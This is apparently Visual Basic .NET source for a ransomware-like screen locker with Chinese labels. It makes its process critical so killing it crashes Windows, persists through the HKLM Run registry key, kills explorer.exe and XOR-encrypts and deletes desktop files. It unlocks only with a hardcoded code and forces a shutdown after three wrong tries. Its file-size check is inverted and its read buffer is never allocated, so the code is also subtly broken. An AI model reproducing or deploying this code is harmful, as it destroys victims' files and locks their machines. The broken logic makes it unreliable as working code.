Imports System.Runtime.InteropServices
Imports Microsoft.Win32
Imports System.IO
Imports System.Threading.Tasks
Imports System.Threading

Public Class Form1
    Public Declare Function RtlSetProcessIsCritical Lib "ntdll" (<MarshalAs(UnmanagedType.Bool)> NewValue As Boolean, ByRef Oldvalue As Boolean, <MarshalAs(UnmanagedType.Bool)> pRtlSetProcessIsCritical As Boolean) As Long
    Public a As Long
    Private bingduKey As RegistryKey
    Private 受害文件 As New List(Of String)

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Process.EnterDebugMode()
        RtlSetProcessIsCritical(True, Nothing, False)
        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("software\microsoft\windows\currentversion\run", True)
        key.SetValue("givememony", Application.ExecutablePath)
        bingduKey = key
        Me.Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Me.Location = New Point(0, 0)
        Shell("taskkill.exe /im explorer.exe /f", 0)
        If My.Settings.IsEnc Then
            Exit Sub
        End If
        Dim desktop As String = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)
        ThreadPool.QueueUserWorkItem(AddressOf twjm, desktop)
        My.Settings.IsEnc = True
        My.Settings.Save()
    End Sub
    <Obsolete> Sub 加密()
        If My.Settings.IsEnc Then
            Exit Sub
        End If
        Dim desktop As String = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)
        For Each Dfile In Directory.EnumerateFiles(desktop)
            Try
                Dim filestream As New FileStream(Dfile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
                Dim buffer As Byte()
                If filestream.Length > (2 ^ 31 - 2) Then '不处理超过2G的文件
                    filestream.Read(buffer, 0, filestream.Length)
                Else
                    Throw New Exception
                End If
                File.Delete(Dfile)
                For i = 0 To buffer.Length - 1
                    buffer(i) = buffer(i) Xor 233
                Next
                Dim Efile As String = Dfile & DateTime.UtcNow.ToLongDateString() & DateTime.UtcNow.ToLongTimeString() & ".加密"
                受害文件.Add(Efile)
                Dim fs2 As New FileStream(Efile, FileMode.Create)
                fs2.Write(buffer, 0, buffer.Length)
            Catch ex As Exception

            End Try
        Next
        My.Settings.IsEnc = True
        My.Settings.Save()
    End Sub
    Sub twjm(path As String)
        Try
            If Directory.Exists(path) Then
                Try
                    For Each Dfile In Directory.EnumerateFiles(path)
                        Try
                            Dim filestream As New FileStream(Dfile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
                            Dim buffer As Byte()
                            If filestream.Length > (2 ^ 31 - 2) Then '不处理超过2G的文件
                                filestream.Read(buffer, 0, filestream.Length)
                            Else
                                Throw New Exception
                            End If
                            File.Delete(Dfile)
                            For i = 0 To buffer.Length - 1
                                buffer(i) = buffer(i) Xor 233
                            Next
                            Dim Efile As String = Dfile & DateTime.UtcNow.ToLongDateString() & DateTime.UtcNow.ToLongTimeString() & ".加密"
                            受害文件.Add(Efile)
                            Dim fs2 As New FileStream(Efile, FileMode.Create)
                            fs2.Write(buffer, 0, buffer.Length)
                        Catch ex As Exception

                        End Try
                    Next
                Catch ex As Exception
                End Try
                Try
                    For Each DFold In Directory.EnumerateDirectories(path)
                        twjm(DFold)
                    Next
                Catch ex As Exception
                End Try
            End If
        Catch exe As Exception
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Label10.Text = "机会有限哦，三次之后作为一个小小的惩罚就蓝屏一下"
        If TextBox1.Text = "1234567890" Then
            RtlSetProcessIsCritical(False, Nothing, False)
            bingduKey.DeleteValue("givememony")
            Shell("explorer.exe")
            End
        Else
            a = a + 1
        End If
        If a = 3 Then
            Shell("shutdown.exe /s /t 0", 0)
            Threading.ThreadPool.QueueUserWorkItem(Sub()
                                                       MsgBox("关机了",, "hahaha")
                                                   End Sub)
            Threading.Thread.Sleep(1000)
            End
        End If
    End Sub
End Class
